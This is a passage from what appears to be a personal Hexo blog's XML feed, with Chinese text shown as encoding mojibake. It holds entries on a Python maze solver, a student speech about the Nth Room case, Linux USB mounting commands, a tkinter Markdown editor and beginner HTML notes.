class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;No result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">del</span>(frontier[<span class="number">0</span>])</span><br><span class="line">        explored.append(Unit((current.x,current.y),current.parent))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current.x == goal.x <span class="keyword">and</span> current.y == goal.y:</span><br><span class="line">            print(<span class="string">&quot;\nGot it!\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            route_trace(current,explored)</span><br><span class="line">            map_show(map1)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        action(frontier,explored,current)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(frontier) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;No result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        current = frontier[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">travel(map1,start)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # #         B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">A           <span class="comment"># # # # </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Got it!</span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . . . . B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line">          .         </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line">A . . . . . <span class="comment"># # # # </span></span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œè¿™ä¸ªç¨‹åºå·²ç»èƒ½å¤Ÿæ‰¾å‡ºå„ç§è¿·å®«åœ°å›¾çš„è§£æ³•äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬å¯¹åœ°å›¾è¿›è¡Œä¿®æ”¹ï¼Œç¨‹åºä¹Ÿèƒ½å¤Ÿæ­£å¸¸è¿è¡Œå¹¶è¾“å‡ºç›¸åº”ç»“æœï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬å°†åœ°å›¾çš„å”¯ä¸€é“è·¯â€œå°æ­»â€ï¼Œé‚£ä¹ˆç»“æœå°±ä¼šæ˜¯â€œNo resultâ€ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # #         B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">A     <span class="comment">#     # # # # </span></span><br><span class="line"></span><br><span class="line">No result</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†å¯¹æ­¤æƒ…å¢ƒä¸‹ç›¸å…³ä»£ç çš„ç¼–å†™ã€‚</p><p>ä¿®æ”¹äº2021.04.11</p>]]></content>
      
      
      
        <tags>
            
            <tag> çŸ¥è¯†è¾“å‡º </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¥è‡ªç­çº§ç»„ç»‡æ¼”è®²çš„ä¸€ç¯‡æ¼”è®²ç¨¿</title>
      <link href="2021/04/10/Speech/"/>
      <url>2021/04/10/Speech/</url>
      
        <content type="html"><![CDATA[<h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>åœ°ç‹±ç©ºè¡è¡ æ¶é­”åœ¨äººé—´</p><p>æƒ³å¿…åœ¨åº§å„ä½å¤šå°‘çœ‹è¿‡è¿™å¥è¯ï¼Œè¿™å°±æ˜¯æˆ‘ä»Šå¤©è¦è¯´çš„æœ‰å…³Telegram Nå·æˆ¿äº‹ä»¶çš„ä¸€äº›ä¸œè¥¿ï¼›ç”±äºæ¡ˆæƒ…å¤æ‚ï¼Œæˆ‘å°±ä¸å†èµ˜è¿°ï¼Œæœ‰å…´è¶£çš„è¯·è‡ªè¡Œç™¾åº¦<br>ä¸»è¦äººç‰©ä»‹ç»ï¼š<a id="more"></a><br>èµµä¸»å½¬ï¼šç°å¹´25å²ï¼Œä¿¡æ¯é€šä¿¡ä¸“ä¸šï¼Œæ›¾æ‹…ä»»å­¦æŠ¥ç¼–è¾‘éƒ¨ç¼–è¾‘ã€‚å¤šæ¬¡è·å¾—å¥–å­¦é‡‘ã€‚3å¹´å†…å‚åŠ äº†50å¤šæ¬¡å¿—æ„¿æ´»åŠ¨ã€‚<br>å°±æ˜¯è¿™ä¹ˆä¸€ä¸ªè¡¨é¢äººç•œæ— å®³çš„ä¼˜ç§€å­¦ç”Ÿï¼Œä¸»å¯¼äº†è¿™ä¹ˆä¸€èµ·äº‹ä»¶ã€‚<br>å¯¹æ­¤äººè¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬ä¸éš¾å¾—å‡ºï¼šå¹³å°ç”¨telegramï¼Œäº¤æ˜“ç”¨æ¯”ç‰¹å¸ï¼Œè¯´æ˜ç½ªçŠ¯åä¾¦æŸ¥æ„è¯†é«˜ï¼Œæ€ç»´æ•æ·ï¼Œå¯ä»¥å½’ç±»ä¸ºé«˜æ™ºå•†ä¿¡æ¯çŠ¯ç½ªï¼›å†…å¿ƒè‡ªå‘ï¼Œä½†æ˜¯å¤–å›´æ€§æ ¼ç‰¹å¾è¡¨ç°ä¸ºè‡ªè´Ÿï¼Œå› æ— æ³•è¾¾åˆ°è‡ªèº«çš„é«˜åº¦é¢„æœŸéƒä¸å¾—å¿—ï¼Œå› æ­¤å¯èƒ½å­˜åœ¨ç¤¾ä¼šåè§ï¼Œæœ‰ä¸€å®šæ¦‚ç‡å‘å±•ä¸ºåç¤¾ä¼šå‹äººæ ¼ï¼›å¯èƒ½å­˜åœ¨å®¶åº­æš´åŠ›ï¼Œä¸”æ˜¯çˆ¶æƒå®¶åº­ï¼›ç¤¾äº¤èƒ½åŠ›è¾ƒå·®ï¼Œæ’æ–¥ç”šè‡³ä»‡è§†å¥³æ€§ï¼Œè¿™ç‚¹å¯ä»¥ä»ä»–åœ¨è¢«æ•åçš„è¨€è®ºå‘è¡¨çŸ¢å£ä¸è°ˆå¯¹å¥³æ€§çš„é“æ­‰è¿™ä¸€ç‚¹å¯ä»¥çœ‹å‡ºã€‚</p><p>æœ‰çš„å­©å­æ˜¯å­©å­ï¼Œæœ‰çš„å­©å­æ˜¯ç¦½å…½<br>è¿™åå‡ å¹´éƒ½å¡äº†ä»€ä¹ˆè¿›è„‘å­é‡Œ<br>äººåä¸æ‰“ç ï¼Œé©¬èµ›å…‹åšé”™äº†ä»€ä¹ˆ</p><p>å°±åƒè¿™äº›è¯„è®ºæ‰€è¡¨è¿°çš„ä¸€æ ·ï¼Œæˆ‘ä¹Ÿç—›æ¨è¿™äº›ç²¾è™«ä¸Šè„‘çš„ä¸œè¥¿ã€‚ä½†æ˜¯å‡ ä¹ä¸€è¾¹å€’çš„ç½‘ç»œèˆ†è®ºæ˜¾ç„¶æœ‰äº›é—®é¢˜ï¼šè¿™26ä¸‡äººä¸ªä¸ªéƒ½ç½ªè¯¥ä¸‡æ­»å—ï¼Ÿè€ƒè™‘åˆ°æ¶‰æ¡ˆäººæ•°åŠæ¡ˆä»¶çš„å¤æ‚ç¨‹åº¦ï¼Œæˆ‘ä¸ªäººè§‰å¾—å…¶ä¸­è¿˜æ˜¯ä¸ä¹è¢«æ•™å”†çš„ï¼Œå—è’™éª—çš„ï¼Œç”šè‡³ä¸æ˜æƒ…å†µçš„ã€‚ä¸æ˜¯è¯´å¼ºè¡Œæ´—ç™½ï¼Œè€Œæ˜¯æˆ‘è®¤ä¸ºæ¯ä¸ªäººçœ‹å¾…äº‹æƒ…éƒ½åº”è¯¥æœ‰è‡ªå·±çš„çœ‹æ³•ï¼Œæœ‰é‚£ç§ä¸è¢«èˆ†è®ºå¤§åŠ¿æ‰€åŠ¨æ‘‡çš„é‚£ç§çœ‹æ³•ã€‚<br>å¤§å®¶æ˜¯å¦çœ‹è¿‡è¿™æ ·ä¸€ä¸ªæ¯”å–»ï¼šéŸ©å›½ç›®å‰åœ¨è¿è¥çš„å‡ºç§Ÿè½¦å¤§æ¦‚æœ‰26ä¸‡è¾†ï¼Œè¿™æ„å‘³ç€åœ¨éŸ©å›½çš„å¤§è¡—ä¸Šï¼Œé‡åˆ°Nå·æˆ¿ä¼šå‘˜å°±åƒé‡åˆ°å‡ºç§Ÿè½¦ä¸€æ ·é¢‘ç¹ã€‚<br>ä¸çŸ¥å„ä½å¯¹è¿™ä¸ªæ¯”å–»æœ‰ä»€ä¹ˆçœ‹æ³•<br>åœ¨æˆ‘çœ‹æ¥ï¼Œè¿™æ˜¯ä¸€ç§ä¸‹æ„è¯†çš„æƒ…æ™¯æç»˜ï¼Œæ—¨åœ¨æ”¾å¤§æ¡ˆä»¶æ¶‰åŠçš„èŒƒå›´ï¼Œè€Œè¿™ç§æƒ…æ™¯æç»˜äºæˆ‘æ¥çœ‹é™¤äº†æ”¾å¤§ææ…Œä¹‹å¤–æ²¡æœ‰ä»»ä½•ç”¨å¤„ï¼Œé‚£ä»–ä»¬è¿™ä¹ˆåšçš„ç›®çš„ä½•åœ¨å‘¢ï¼Ÿè¦æˆ‘è¯´è¦ä¸å°±æ˜¯å…¬ä¼—å·åšäººçœ¼çƒï¼Œè¦ä¸å°±æ¶‰åŠåˆ°é»‘å…¬å…³å¸¦èŠ‚å¥ï¼Œç”±äºè¿™æ˜¯ä¸€ä¸ªå›½å®¶çº§çš„æ¡ˆä»¶ï¼Œæ¯”èµ·èƒŒåå¤§åˆ°ä»¤äººæ— æ³•æƒ³è±¡çš„é»‘ç°äº§ä¸šé“¾ï¼Œæˆ‘è¿˜æ˜¯æ›´å€¾å‘äºå‰è€…ã€‚</p><p>æœ€åï¼Œå¼•ç”¨äº†å‡ å¥æŸäº›å…¬ä¼—å·çš„è¯„ä»·ä½œä¸ºæˆ‘å¯¹æ­¤äº‹çš„çœ‹æ³•ï¼Œè¯å¾ˆç²—ï¼Œä½†ç†ä¸ç²—ï¼š<br>ä½œä¸ºä¸€ä¸ªæˆå¹´äººï¼Œè¦å­¦ä¼šå…‹åˆ¶ï¼Œä¸è¯¥é¦‹çš„ä¸è¦é¦‹ã€‚<br>æˆ‘çŸ¥é“ç°åœ¨æ˜¯æ˜¥å¤©ï¼Œä½†åªæœ‰é‡ç‹—æ‰ä¸åˆ†åœºåˆã€ä¸åˆ†å¯¹è±¡ï¼Œæ—¶åˆ»æƒ³ç€äº¤é…ã€‚<br>ä½•å†µï¼Œé‡ç‹—ä¹Ÿåªåœ¨æ˜¥ç§‹ä¸¤å­£æ‰å‘æƒ…</p><h2 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h2><p>ç”±äºç­çº§ç»„ç»‡çš„æ¼”è®²é™æ—¶3åˆ†é’Ÿï¼Œæ‰€ä»¥æˆ‘ä¸å¾—ä¸æŠŠåŸæœ¬ä¸€åƒå¤šå­—çš„æ¼”è®²ç¨¿åˆ ä¸º800å¤šå­—ï¼Œä¹Ÿå› æ­¤ç¼ºå¤±äº†å¾ˆå¤šäº‹ä»¶çš„ç»†èŠ‚åŠä¸ªäººçš„è§‚ç‚¹ã€‚<br>â€“2020.05.07</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linuxä¸‹åˆ©ç”¨å‘½ä»¤è¡Œå¯¹Uç›˜å’Œç”µè„‘ä¸­çš„æ–‡ä»¶è¿›è¡Œæ“ä½œ</title>
      <link href="2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/"/>
      <url>2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l<span class="comment">#æŸ¥çœ‹æ¥å…¥è®¾å¤‡åç§°</span></span><br><span class="line">mount /dev/sda1 /mnt <span class="comment">#æŒ‚è½½Uç›˜</span></span><br><span class="line">ls /mnt<span class="comment">#æŸ¥çœ‹Uç›˜æ–‡ä»¶</span></span><br><span class="line">cp file directory<span class="comment">#å¤åˆ¶æŒ‡å®šæ–‡ä»¶fileè‡³æŒ‡å®šç›®å½•directory</span></span><br><span class="line">ls /mnt<span class="comment">#å†æ¬¡æŸ¥çœ‹Uç›˜æ–‡ä»¶</span></span><br><span class="line">umount /mnt<span class="comment">#å¸è½½Uç›˜</span></span><br></pre></td></tr></table></figure><div class="note "><p><strong>æ ‡é¢˜ï¼ˆå¯é€‰ï¼‰</strong></p><p>æç¤ºï¼š<br>è‹¥æ“ä½œä¸­å‡ºç°é”™è¯¯ï¼Œè¯·æŸ¥çœ‹æƒé™æ˜¯å¦æ­£ç¡®ï¼Œæˆ–åœ¨æ¯æ¬¡æ“ä½œå‰åŠ â€™sudoâ€™<br>cpåçš„æ–‡ä»¶å’Œè·¯å¾„éœ€å¸¦è·¯å¾„(ä¸ªäººæ¨èç»å¯¹è·¯å¾„)</p></div>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown_Editor V1.0</title>
      <link href="2021/04/10/Markdown_Editor%20V1.0/"/>
      <url>2021/04/10/Markdown_Editor%20V1.0/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># -*- coding=utf-8 -*- </span></span><br><span class="line">import tkinter</span><br><span class="line">import os</span><br><span class="line">from tkinter import filedialog</span><br><span class="line"></span><br><span class="line">win_size=<span class="string">&#x27;450x550&#x27;</span></span><br><span class="line">win = tkinter.Tk()</span><br><span class="line">win.geometry(win_size)</span><br><span class="line"></span><br><span class="line">win.title(<span class="string">&#x27;Markdown Editor V1.0 (hexo only)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def processandsave():</span><br><span class="line">   contents = <span class="string">&#x27;---\ntitle:&#x27;</span> + title.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>) + <span class="string">&#x27;tags:&#x27;</span> + tags.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>) + <span class="string">&#x27;---\n&#x27;</span> + content.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">   filename = filedialog.asksaveasfilename()</span><br><span class="line">   <span class="keyword">if</span> filename is not None:</span><br><span class="line">       with open(file=filename,mode=<span class="string">&#x27;w&#x27;</span>) as file:</span><br><span class="line">           file.write(str(contents))</span><br><span class="line">           title.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">           tags.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">           content.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def add_bash():</span><br><span class="line">    add_content=add_bash_text.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    add_content=add_content.rstrip()</span><br><span class="line">    changing_content=<span class="string">&#x27;```bash\n&#x27;</span>+add_content+<span class="string">&#x27;\n```\n&#x27;</span></span><br><span class="line">    content.insert(<span class="string">&#x27;end&#x27;</span>,changing_content)</span><br><span class="line">    add_bash_text.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line"></span><br><span class="line">label1=tkinter.Label(text=<span class="string">&#x27;æ ‡é¢˜&#x27;</span>,padx=10,pady=10)</span><br><span class="line">label1.grid(row=0,column=0)</span><br><span class="line"></span><br><span class="line">title=tkinter.Text(width=40,height=2)</span><br><span class="line">title.grid(row=0,column=1,columnspan=2)</span><br><span class="line"></span><br><span class="line">label2=tkinter.Label(text=<span class="string">&#x27;æ ‡ç­¾&#x27;</span>,padx=5,pady=5)</span><br><span class="line">label2.grid(row=1,column=0)</span><br><span class="line"></span><br><span class="line">tags=tkinter.Text(width=30,height=1)</span><br><span class="line">tags.grid(row=1,column=1)</span><br><span class="line"></span><br><span class="line">label3=tkinter.Label(text=<span class="string">&#x27;æ­£æ–‡&#x27;</span>,padx=5,pady=5)</span><br><span class="line">label3.grid(row=2,column=0)</span><br><span class="line"></span><br><span class="line">content=tkinter.Text(width=40,height=20)</span><br><span class="line">content.grid(row=2,column=1,rowspan=5)</span><br><span class="line"></span><br><span class="line">add_bash_button=tkinter.Button(win,text=<span class="string">&#x27;å‘½ä»¤è¡Œ&#x27;</span>,<span class="built_in">command</span>=add_bash)</span><br><span class="line">add_bash_button.grid(row=9,column=0)</span><br><span class="line"></span><br><span class="line">add_bash_text=tkinter.Text(width=40,height=5)</span><br><span class="line">add_bash_text.grid(row=9,column=1)</span><br><span class="line"></span><br><span class="line">save_button=tkinter.Button(win,text=<span class="string">&#x27;ä¿å­˜&#x27;</span>,<span class="built_in">command</span>=processandsave)</span><br><span class="line">save_button.grid(row=8,column=1)</span><br><span class="line"></span><br><span class="line">win.mainloop()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thanksgiving</title>
      <link href="2021/04/10/img_share/"/>
      <url>2021/04/10/img_share/</url>
      
        <content type="html"><![CDATA[<p><img src="https://www.helloimg.com/images/2020/11/28/bb7b96be-d4be-4657-b90c-a5f1df2909619ac20bd2ad5eb347.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2020/11/28/bb7b96be-d4be-4657-b90c-a5f1df2909619ac20bd2ad5eb347.jpg" srcset="data:image/png;base64,666" alt="arknights_20201128"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTMLç¬”è®°</title>
      <link href="2021/04/10/HTML_notes/"/>
      <url>2021/04/10/HTML_notes/</url>
      
        <content type="html"><![CDATA[<pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">1 &lt;h1&gt; to &lt;/h6&gt;: ä¸€åˆ°å…­å·æ ‡é¢˜</span><br><span class="line">2 &lt;p&gt;æ®µè½&lt;/p&gt;</span><br><span class="line">3 &lt;body style=<span class="string">&quot;background-color:PowderBlue;&quot;</span>&gt;</span><br><span class="line">  &lt;p style=<span class="string">&quot;font-family:verdana;color:red&quot;</span>&gt;å¯¹æ®µè½æ ·å¼è¿›è¡Œä¿®æ”¹&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">4 &lt;br /&gt;&lt;hr /&gt;&lt;!è¿™æ˜¯æ³¨é‡Šï¼Œå‰é¢çš„æ˜¯æ¢è¡Œå’Œåˆ†å‰²çº¿&gt;</span><br><span class="line">5 &lt;b&gt;è¢«åŠ ç²—çš„å†…å®¹&lt;/b&gt;</span><br><span class="line">6 &lt;strong&gt;è¢«...åŠ ç²—çš„å†…å®¹...å§&lt;/strong&gt;</span><br><span class="line">7 &lt;big&gt;è¢«åŠ å¤§çš„å†…å®¹&lt;/big&gt;</span><br><span class="line">8 &lt;em&gt;è¢«å¼ºè°ƒ(åŠ æ–œ)çš„å†…å®¹&lt;/em&gt;</span><br><span class="line">9 &lt;i&gt;è¢«...æ„å¤§åˆ©å¼åŠ æ–œçš„å†…å®¹&lt;/i&gt;</span><br><span class="line">10 &lt;small&gt;è¢«å‡å°çš„å†…å®¹&lt;/small&gt;</span><br><span class="line">11 &lt;sub&gt;ä½äºå³ä¸‹è§’çš„å°å­—éƒ¨åˆ†&lt;/sub&gt;</span><br><span class="line">12 &lt;sup&gt;ä½äºå³ä¸Šè§’çš„å°å­—éƒ¨åˆ†&lt;/sup&gt;</span><br><span class="line">13 &lt;pre&gt;é¢„æ ¼å¼æ–‡æœ¬(ä¿ç•™äº†ç©ºæ ¼å’Œæ¢è¡Œ)&lt;/pre&gt;</span><br><span class="line">14 &lt;code&gt;ç”¨äº&lt;/code&gt;,&lt;kbd&gt;æ˜¾ç¤º&lt;/kbd&gt;,&lt;samp&gt;ä»£ç &lt;/samp&gt;,&lt;var&gt;è¿™ä¸ªåŠ å¤§åŠ ç²—äº†ä¸€ç‚¹&lt;/var&gt;</span><br><span class="line">15 &lt;address&gt;ç”¨äºä¹¦å†™åœ°å€ï¼Œå…¶ä¸­è®°å¾—æ‰‹åŠ¨æ·»åŠ æ¢è¡Œæ ‡ç­¾&lt;/address&gt;</span><br><span class="line">16 &lt;abbr title=<span class="string">&quot;etcetera&quot;</span>&gt;etc.&lt;/abbr&gt;</span><br><span class="line">17 &lt;acronym title=<span class="string">&quot;World Wide Web&quot;</span>&gt;WWW&lt;/acronym&gt;</span><br><span class="line">18 &lt;bdo dir=<span class="string">&quot;rtl&quot;</span>&gt;å°æ‰“åºå€’&lt;/bdo&gt;</span><br><span class="line">19 &lt;blockquote&gt;å—å¼•ç”¨&lt;/blockquote&gt;,&lt;q&gt;çŸ­å¼•ç”¨&lt;/q&gt;</span><br><span class="line">20 &lt;p&gt;ä½ çœ‹&lt;del&gt;æˆ‘è¢«åˆ’æ‰äº†&lt;/del&gt;&lt;ins&gt;åˆè¢«åŠ ä¸‹åˆ’çº¿äº†&lt;/ins&gt;&lt;/p&gt;</span><br><span class="line">21 &lt;a name=<span class="string">&quot;tips&quot;</span>&gt;åŸºæœ¬çš„æ³¨æ„äº‹é¡¹ - æœ‰ç”¨çš„æç¤º&lt;/a&gt; &lt;a href=<span class="string">&quot;#tips&quot;</span>&gt;æœ‰ç”¨çš„æç¤º&lt;/a&gt;</span><br><span class="line">22 &lt;img src=<span class="string">&quot;url&quot;</span> width=xx height=xx align=xxx /&gt;</span><br><span class="line">23 &lt;table border=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">     &lt;th&gt;Heading&lt;/th&gt;</span><br><span class="line">     &lt;th&gt;Another Heading&lt;/th&gt;</span><br><span class="line">     &lt;/tr&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">     &lt;td&gt;row 1, cell 1&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;row 1, cell 2&lt;/td&gt;</span><br><span class="line">     &lt;/tr&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">     &lt;td&gt;row 2, cell 1&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;row 2, cell 2&lt;/td&gt;</span><br><span class="line">     &lt;/tr&gt;</span><br><span class="line">     &lt;/table&gt;</span><br><span class="line">24 &lt;ul&gt;&lt;!unsorted list&gt;</span><br><span class="line">     &lt;li&gt;Coffee&lt;/li&gt;</span><br><span class="line">     &lt;li&gt;Milk&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">25 &lt;ol&gt;&lt;!ordered list&gt;</span><br><span class="line">     &lt;li&gt;Coffee&lt;/li&gt;</span><br><span class="line">     &lt;li&gt;Milk&lt;/li&gt;</span><br><span class="line">     &lt;/ol&gt;</span><br><span class="line">26 &lt;dl&gt;&lt;!defined list&gt;</span><br><span class="line">     &lt;dt&gt;Coffee&lt;/dt&gt;</span><br><span class="line">     &lt;dd&gt;Black hot drink&lt;/dd&gt;</span><br><span class="line">     &lt;dt&gt;Milk&lt;/dt&gt;</span><br><span class="line">     &lt;dd&gt;White cold drink&lt;/dd&gt;</span><br><span class="line">  